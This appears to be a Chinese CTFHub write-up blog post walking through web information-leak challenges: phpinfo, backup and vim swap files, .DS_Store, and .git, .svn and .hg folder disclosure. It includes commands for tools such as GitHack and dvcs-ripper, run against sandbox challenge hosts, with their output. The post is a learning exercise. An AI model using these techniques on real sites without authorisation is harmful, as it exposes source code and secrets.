main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h1 id=目录遍历>目录遍历<a hidden class=anchor aria-hidden=true href=#目录遍历>#</a></h1><blockquote><p>Des: N/A。</p></blockquote><p>页面如下：</p><p><img loading=lazy src=https://cdn.jsdelivr.net/gh/oopsdc/PicBed@main/PicGo/image-20220813215728492.png alt></p><p>点击按钮后会进入一个在线<code>FTP</code>目录：</p><p><img loading=lazy src=https://cdn.jsdelivr.net/gh/oopsdc/PicBed@main/PicGo/image-20220813215823688.png alt></p><p>挨个进入查看即可。</p><p>获得<code>flag</code>。</p><h1 id=phpinfo>PHPINFO<a hidden class=anchor aria-hidden=true href=#phpinfo>#</a></h1><blockquote><p>Des: N/A。</p></blockquote><p>页面如下：</p><p><img loading=lazy src=https://cdn.jsdelivr.net/gh/oopsdc/PicBed@main/PicGo/image-20220813220030814.png alt></p><p>点击按钮进入<code>phpinfo</code>页面，<code>Ctrl+F</code>搜索<code>flag</code>即可在<code>Environment</code>中的变量中找到<code>flag</code>。</p><p><img loading=lazy src=https://cdn.jsdelivr.net/gh/oopsdc/PicBed@main/PicGo/image-20220813220203646.png alt></p><p>获得<code>flag</code>。</p><h2 id=拓展phpinfo>拓展：phpinfo<a hidden class=anchor aria-hidden=true href=#拓展phpinfo>#</a></h2><p><a href=https://www.php.net/manual/en/function.phpinfo.php>PHP: phpinfo - Manual</a></p><p><code>phpinfo</code>包含所有<code>EGPCS(Environment, GET, POST, Cookie, Server)</code>数据，通过<code>phpinfo</code>页面我们能获取到服务器的很多配置信息，在后续的文件上传等操作上能依据该页面的禁用函数定制攻击手法。</p><h1 id=备份文件下载>备份文件下载<a hidden class=anchor aria-hidden=true href=#备份文件下载>#</a></h1><h2 id=网站源码>网站源码<a hidden class=anchor aria-hidden=true href=#网站源码>#</a></h2><blockquote><p>Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p></blockquote><p>页面如下：</p><p><img loading=lazy src=https://cdn.jsdelivr.net/gh/oopsdc/PicBed@main/PicGo/image-20220813223238837.png alt></p><p>尝试访问<code>www.zip</code>，成功获取网站源码。</p><p>获得<code>flag</code>。</p><h2 id=bak文件>bak文件<a hidden class=anchor aria-hidden=true href=#bak文件>#</a></h2><blockquote><p>Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p></blockquote><p>页面内容如下：</p><pre tabindex=0><code>Flag in index.php source code.
</code></pre><p>网站默认首页为<code>index.php</code>，查看页面源码没有任何信息，尝试获取<code>index.php</code>源码，联想到题目给的<code>bak</code>文件，尝试访问<code>index.php.bak</code>，成功获取<code>index.php.bak</code>文件。</p><p>获得<code>flag</code>。</p><h2 id=vim缓存>vim缓存<a hidden class=anchor aria-hidden=true href=#vim缓存>#</a></h2><blockquote><p>Des: 当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p></blockquote><p>页面如下：</p><pre tabindex=0><code>备份文件下载 - vim

flag 在 index.php 源码中
</code></pre><p>页面提示我们获取<code>index.php</code>文件，再根据题目名称我们大概可知具体方法为获取<code>index.php</code>的<code>vim</code>缓存文件，访问<code>.index.php.swp</code>即可，此处在<code>index.php</code>之前加<code>.</code>是因为<code>vim</code>缓存文件默认为隐藏文件，所以文件名前有个<code>.</code>。获取到<code>index.php.swp</code>文件后我们先在<code>Linux</code>中使用<code>touch</code>命令创建一个同名文件<code>index.php</code>，再使用<code>vim -r &lt;filename></code>恢复文件内容。</p><h2 id=拓展vim文件备份>拓展：vim文件备份<a hidden class=anchor aria-hidden=true href=#拓展vim文件备份>#</a></h2><p>用户在使用<code>vim</code>的过程中若因断电、网络不稳定(如终端突然断开等情况)等原因突然中断文件编辑时，第一次<code>vim</code>会在当前目录生成一个与编辑文件同名的后缀为<code>.swp</code>的备份文件，第二次后缀为<code>swo</code>，第三次后缀为<code>swn</code>。用户可使用<code>vim -r</code>命令查看当前目录下的所有<code>swp</code>文件，<strong>在当前目录存在与备份文件同名的文件时</strong>，使用<code>vim -r &lt;filename></code>命令将备份文件中的内容覆盖至文件。</p><h2 id=ds_store>.DS_Store<a hidden class=anchor aria-hidden=true href=#ds_store>#</a></h2><blockquote><p>Des: .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p></blockquote><p>页面内容：</p><pre tabindex=0><code>备份文件下载 - DS_Store

试着寻找 flag
</code></pre><p>此处使用<code>dumpall</code>工具<a href=https://github.com/0xHJK/dumpall>0xHJK/dumpall: 一款信息泄漏利用工具，适用于.git/.svn/.DS_Store泄漏和目录列出 (github.com)</a>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 dumpall.py -u http://challenge-1e2e8ffbe3e72091.sandbox.ctfhub.com:10800/.DS_Store
</span></span></code></pre></div><p>结果：</p><pre tabindex=0><code>[200] http://challenge-1e2e8ffbe3e72091.sandbox.ctfhub.com:10800/47a90c9e8d66b6a1eb9c411204e7a934.txt 47a90c9e8d66b6a1eb9c411204e7a934.txt
</code></pre><p>直接访问链接。</p><p>获得<code>flag</code>。</p><h1 id=git泄露>Git泄露<a hidden class=anchor aria-hidden=true href=#git泄露>#</a></h1><h2 id=log>Log<a hidden class=anchor aria-hidden=true href=#log>#</a></h2><blockquote><p>Des: 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题。</p></blockquote><p>工具地址：<a href=https://github.com/BugScanTeam/GitHack>BugScanTeam/GitHack: .git 泄漏利用工具，可还原历史版本 (github.com)</a></p><p>工具利用：</p><pre tabindex=0><code> python2 GitHack.py http://challenge-dc11daca3e6b9249.sandbox.ctfhub.com:10800/.git
 
 # 攻击日志
   ____ _ _   _   _            _
 / ___(_) |_| | | | __ _  ___| | __
| |  _| | __| |_| |/ _` |/ __| |/ /
| |_| | | |_|  _  | (_| | (__|   &lt;
 \____|_|\__|_| |_|\__,_|\___|_|\_\{0.0.5}
 A &#39;.git&#39; folder disclosure exploit.

[*] Check Depends
[+] Check depends end
[*] Set Paths
[*] Target Url: http://challenge-dc11daca3e6b9249.sandbox.ctfhub.com:10800/.git/
[*] Initialize Target
[*] Try to Clone straightly
[*] Clone
Cloning into &#39;/root/tools/GitHack/dist/challenge-dc11daca3e6b9249.sandbox.ctfhub.com_10800&#39;...
fatal: repository &#39;http://challenge-dc11daca3e6b9249.sandbox.ctfhub.com:10800/.git/&#39; not found
[-] Clone Error
[*] Try to Clone with Directory Listing
[*] http://challenge-dc11daca3e6b9249.sandbox.ctfhub.com:10800/.git/ is not support Directory Listing
[-] [Skip][First Try] Target is not support Directory Listing
[*] Try to clone with Cache
[*] Initialize Git
[!] Initialize Git Error: hint: Using &#39;master&#39; as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint:
hint:   git config --global init.defaultBranch &lt;name&gt;
hint:
hint: Names commonly chosen instead of &#39;master&#39; are &#39;main&#39;, &#39;trunk&#39; and
hint: &#39;development&#39;. The just-created branch can be renamed via this command:
hint:
hint:   git branch -m &lt;name&gt;

[*] Cache files
[*] packed-refs
[*] config
[*] HEAD
[*] COMMIT_EDITMSG
[*] ORIG_HEAD
[*] FETCH_HEAD
[*] refs/heads/master
[*] refs/remote/master
[*] index
[*] logs/HEAD
[*] logs/refs/heads/master
[*] Fetch Commit Objects
[*] objects/98/10bf645254762b81c98bd738807624695fc847
[*] objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
[*] objects/5e/975018cc48f4f1bd619ba6afbebfa9b295701d
[*] objects/3a/ba889186ca4defd4a2083371d7e524d53abf33
[*] objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
[*] objects/2c/59e3024e3bc350976778204928a21d9ff42d01
[*] objects/25/222d3363054bd0718d58f51389c438681a145a
[*] objects/89/04d877c841d1afd9e2dfaf879e9e785ac90822
[*] Fetch Commit Objects End
[*] logs/refs/remote/master
[*] logs/refs/stash
[*] refs/stash
[*] Valid Repository
[+] Valid Repository Success

[+] Clone Success. Dist File : /root/tools/GitHack/dist/challenge-dc11daca3e6b9249.sandbox.ctfhub.com_10800

# 切换至对应目录
cd dist/challenge-dc11daca3e6b9249.sandbox.ctfhub.com_10800

# git log查看提交历史
git log
commit 9810bf645254762b81c98bd738807624695fc847 (HEAD -&gt; master)
Author: CTFHub &lt;sandbox@ctfhub.com&gt;
Date:   Mon Aug 15 07:42:21 2022 +0000

    remove flag

commit 5e975018cc48f4f1bd619ba6afbebfa9b295701d
Author: CTFHub &lt;sandbox@ctfhub.com&gt;
Date:   Mon Aug 15 07:42:21 2022 +0000

    add flag

commit 25222d3363054bd0718d58f51389c438681a145a
Author: CTFHub &lt;sandbox@ctfhub.com&gt;
Date:   Mon Aug 15 07:42:21 2022 +0000

    init
    
# 可见5e97分支存在flag，我们选择回滚到该分支即可
git reset --hard 5e97
HEAD is now at 5e97501 add flag

# 查看当前目录下文件
ls
170172042812400.txt  50x.html  index.html
</code></pre><p>查看<code>txt</code>文件即可。</p><p>获得<code>flag</code>。</p><h2 id=拓展git简介及git回滚命令>拓展：git简介及git回滚命令<a hidden class=anchor aria-hidden=true href=#拓展git简介及git回滚命令>#</a></h2><p><code>git</code>是一个开源的分布式版本控制系统，可用于管理代码和工作流，以<code>commit</code>为单位。</p><p>当我们需要对<code>git</code>目录进行回滚时，可使用<code>git reset</code>目录，具体有两种用法：</p><pre tabindex=0><code>1. 回滚到指定分支
git reset --hard &lt;commit_id&gt;

2. 回滚到上一分支
git reset --hard HEAD^
我们还可以进一步使用命令回滚到上上一个分支
git reset --hard HEAD^^
</code></pre><p>在输入<code>commit_id</code>时，若<code>id</code>前几位(如前四位)在提交记录中值唯一，那么我们只需输入前四位即可，回滚代码还可使用<code>git revert</code>，此处不详写，感兴趣的读者可自行查阅资料。</p><h2 id=stash>Stash<a hidden class=anchor aria-hidden=true href=#stash>#</a></h2><blockquote><p>Des: 同上。</p></blockquote><p>还是使用<code>GitHack</code>工具，进入对应后查看相关信息：</p><pre tabindex=0><code># 命令
git log

# 结果
commit 8ae0b10fa29bf706e479f82f6717cb8b2caa5a59 (HEAD -&gt; master)
Author: CTFHub &lt;sandbox@ctfhub.com&gt;
Date:   Mon Aug 15 14:14:02 2022 +0000

    remove flag

commit b6111d1498aba67660cb6eca093a7cc94038bb5a
Author: CTFHub &lt;sandbox@ctfhub.com&gt;
Date:   Mon Aug 15 14:14:02 2022 +0000

    add flag

commit d3ee626ec78900eb2fd1ef4db73be31ff2136ba9
Author: CTFHub &lt;sandbox@ctfhub.com&gt;
Date:   Mon Aug 15 14:14:02 2022 +0000

    init
    
# 查看当前目录下的文件
ls
50x.html  index.html

# 查看通过git stash存储的修改列表
git stash list
stash@{0}: WIP on master: b6111d1 add flag

# 将修改追加到最新提交之后，也就是将list中的flag追加到最新提交后
git stash pop

# 查看当前目录下的文件
ls
12452555114914.txt  50x.html  index.html
</code></pre><p>获得<code>flag</code>。</p><h3 id=拓展git-stash简介>拓展：git stash简介<a hidden class=anchor aria-hidden=true href=#拓展git-stash简介>#</a></h3><p><code>git stash</code>一般应用在一些比较复杂的环境中，这条命令会将本地修改保存并将当前代码切换到<code>HEAD</code>提交上。<code>git stash</code>命令其实就是<code>git stash save</code>命令的简写，我们还可通过<code>git stash list</code>查看修改列表、<code>git stash show</code>校验修改列表、<code>git stash apply</code>重新存储。最新的存储位于<code>ref/stash</code>中，可通过<code>stash@{0}</code>获取最新存储，<code>stash@{1}</code>获取次新存储，以此类推。</p><p><code>git stash</code>的每个存储单元在工作仓库中通过<code>commit</code>的形式，由树结构进行展示，其根节点为<code>HEAD</code>所在的提交，工作树如图所示，<code>H</code>代表<code>HEAD</code>提交，<code>I</code>代表存储单元的提交，<code>W</code>代表工作单元的提交：</p><p><img loading=lazy src=https://cdn.jsdelivr.net/gh/oopsdc/PicBed@main/PicGo/image-20220817093330033.png alt></p><p>此处我们以开发过程中需要同步远端代码的情况为例：当我们在进行开发还未调试完成时，不想提交当前代码，但又需要同步关联远端代码。在本地代码和远端代码没有冲突时，可使用<code>git pull</code>命令，但若存在冲突则会拒绝覆盖当前修改，在这种情况下我们仅需使用<code>git stash</code>保存本地代码，<code>git pull</code>同步远端代码后再使用<code>git stash pop</code>将本地代码追加进当前分支即可：</p><pre tabindex=0><code>git stash
git pull
git stash pop
</code></pre><h2 id=index>Index<a hidden class=anchor aria-hidden=true href=#index>#</a></h2><blockquote><p>Des: 同上。</p></blockquote><pre tabindex=0><code># 使用工具
python2 GitHack.py http://challenge-d24592e5c3a594ff.sandbox.ctfhub.com:10800/.git

# 切换到对应目录
cd dist/challenge-d24592e5c3a594ff.sandbox.ctfhub.com_10800

# 查看目录下文件
ls
264482891025009.txt  50x.html  index.html
</code></pre><p>获得<code>flag</code>。</p><h1 id=svn泄露>SVN泄露<a hidden class=anchor aria-hidden=true href=#svn泄露>#</a></h1><blockquote><p>Des: 当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p></blockquote><p>此处使用的<a href=https://github.com/kost/dvcs-ripper>kost/dvcs-ripper: Rip web accessible (distributed) version control systems: SVN/GIT/HG&mldr; (github.com)</a>工具：</p><pre tabindex=0><code># 在运行成功前有两处报错，此处贴上解决方法
报错1：Can&#39;t locate DBI.pm in @INC (you may need to install the DBI module) (@INC contains: /etc/perl /usr/local/lib/x86_64-linux-gnu/perl/5.34.0 /usr/local/share/perl/5.34.0 /usr/lib/x86_64-linux-gnu/perl5/5.34 /usr/share/perl5 /usr/lib/x86_64-linux-gnu/perl-base /usr/lib/x86_64-linux-gnu/perl/5.34 /usr/share/perl/5.34 /usr/local/lib/site_perl) at ./rip-svn.pl line 7.
BEGIN failed--compilation aborted at ./rip-svn.pl line 7.
解决方法：apt install -y libdbi-perl

报错2：install_driver(SQLite) failed: Can&#39;t locate DBD/SQLite.pm in @INC (you may need to install the DBD::SQLite module) (@INC contains: /etc/perl /usr/local/lib/x86_64-linux-gnu/perl/5.34.0 /usr/local/share/perl/5.34.0 /usr/lib/x86_64-linux-gnu/perl5/5.34 /usr/share/perl5 /usr/lib/x86_64-linux-gnu/perl-base /usr/lib/x86_64-linux-gnu/perl/5.34 /usr/share/perl/5.34 /usr/local/lib/site_perl) at (eval 42) line 3.
Perhaps the DBD::SQLite perl module hasn&#39;t been fully installed,
or perhaps the capitalisation of &#39;SQLite&#39; isn&#39;t right.
Available drivers: DBM, ExampleP, File, Gofer, Mem, Proxy, Sponge.
 at ./rip-svn.pl line 85.
解决方法：apt install -y libdbd-sqlite3-perl

# 工具利用
./rip-svn.pl -v -u http://challenge-ee8bd450d496d834.sandbox.ctfhub.com:10800/.svn/
[i] Found new SVN client storage format!
REP INFO =&gt; 1:file:///opt/svn/ctfhub:e43e7ef8-82fb-4194-9673-81c29de69c33
[i] Trying to revert the tree, if you get error, upgrade your SVN client!

# 查看当前目录下.svn目录树
tree .svn
.svn
├── entries
├── format
├── pristine
│   ├── 24
│   │   └── 24e3ff39c1fc315ce64dc8e13aed8bcdc6acecdd.svn-base
│   └── bf
│       └── bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base
├── text-base
├── tmp
└── wc.db
</code></pre><p>查看<code>prisine</code>里的文件即可。</p><p>获得<code>flag</code>。</p><h1 id=hg泄露>HG泄露<a hidden class=anchor aria-hidden=true href=#hg泄露>#</a></h1><blockquote><p>Des: 当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p></blockquote><p>还是使用上一题的工具：</p><pre tabindex=0><code>./rip-hg.pl -v -u http://challenge-22e6994653073985.sandbox.ctfhub.com:10800/.hg/
[i] Downloading hg files from http://challenge-22e6994653073985.sandbox.ctfhub.com:10800/.hg/
[i] Auto-detecting 404 as 200 with 3 requests
[i] Getting correct 404 responses
[d] found 00changelog.i
[d] found dirstate
[d] found requires
[!] Not found for branch: 404 Not Found
[!] Not found for branchheads.cache: 404 Not Found
[d] found last-message.txt
[!] Not found for tags.cache: 404 Not Found
[d] found undo.branch
[d] found undo.desc
[d] found undo.dirstate
[d] found store/00changelog.i
[!] Not found for store/00changelog.d: 404 Not Found
[d] found store/00manifest.i
[!] Not found for store/00manifest.d: 404 Not Found
[d] found store/fncache
[d] found store/undo
[!] Not found for .hgignore: 404 Not Found
[i] Running hg status to check for missing items
cannot find hg: No such file or directory at ./rip-hg.pl line 140.

# 查看.hg目录树
tree .hg
.hg
├── 00changelog.i
├── dirstate
├── last-message.txt
├── requires
├── store
│   ├── 00changelog.i
│   ├── 00manifest.i
│   ├── data
│   ├── fncache
│   └── undo
├── undo.branch
├── undo.desc
└── undo.dirstate

# 查看目录状态
cat .hg/dirstate
&amp;8�}1�&amp;Y��PiH,G��n���^c50x.htmln��
                                       ^K�*
index.htmln��!b�M�flag_2935626550.txt
</code></pre><p>构造链接<code>http://challenge-22e6994653073985.sandbox.ctfhub.com:10800/flag_2935626550.txt</code>。</p><p>获得<code>flag</code>。</p><blockquote><p>文章许可：本文采用<a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>CC BY-NC-SA 4.0</a>许可协议，转载请注明出处。</p></blockquote></div><footer class=post-footer><ul class=post-tags><li><a href=https://oopsdc.com/tags/ctfhub/>CTFHub</a></li></ul><nav class=paginav><a class=prev href=https://oopsdc.com/post/%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/><span class=title>« Prev</span><br><span>密码口令</span></a>
<a class=next href=https://oopsdc.com/post/http%E5%8D%8F%E8%AE%AE/><span class=title>Next »</span><br><span>HTTP协议</span></a></nav></footer><div><div class=pagination__title><span class=pagination__title-h style=font-size:20px>Comments</span><hr></div><div id=tcomment></div><script src=https://cdn.staticfile.org/twikoo/1.6.6/twikoo.all.min.js></script>
<script>twikoo.init({envId:"https://twikoo-oopsdc.vercel.app/",el:"#tcomment",path:window.TWIKOO_MAGIC_PATH||window.location.pathname})</script></div></article></main><footer class=footer><div><span id=busuanzi_container_site_pv>Views: <span id=busuanzi_value_site_pv></span></span>
&nbsp;
<span id=busuanzi_container_site_uv>Visitors: <span id=busuanzi_value_site_uv></span></span></div><span>&copy; 2022 <a href=https://oopsdc.com/>0opsdc</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>